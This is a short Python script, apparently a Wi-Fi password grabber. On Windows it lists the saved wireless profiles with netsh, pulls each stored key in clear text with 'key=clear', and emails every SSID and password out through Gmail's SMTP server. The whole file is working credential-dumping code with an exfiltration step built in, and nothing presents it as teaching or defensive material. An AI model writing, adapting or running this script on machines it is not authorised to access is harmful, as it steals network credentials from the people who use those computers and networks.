import subprocess
import re
import smtplib

def send_mail(msg):
    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()
    sender_email = input("Enter your Email: ")
    sender_password = input("Enter your password: ")

    reciever_email = sender_email

    s.login(sender_email, sender_password)
    message = msg
    s.sendmail(sender_email, reciever_email, message)
    print("Check your inbox !!!")
    s.quit()


command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
# print(profile_names)

wifi_list = []

if len(profile_names) != 0:

    for name in profile_names:
        wifi_profile = {}
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()

        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile["SSID"] = name
            profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
            password = re.search("Key Content            : (.*)\r", profile_info)

            if password == None:
                wifi_profile["PASSWORD"] = None
            else:
                wifi_profile["PASSWORD"] = password[1]
            # print(wifi_profile)
            wifi_list.append(wifi_profile)

info = "Hello\n"
for x in wifi_list:
    info += str(x) + "\n"

send_mail(info)
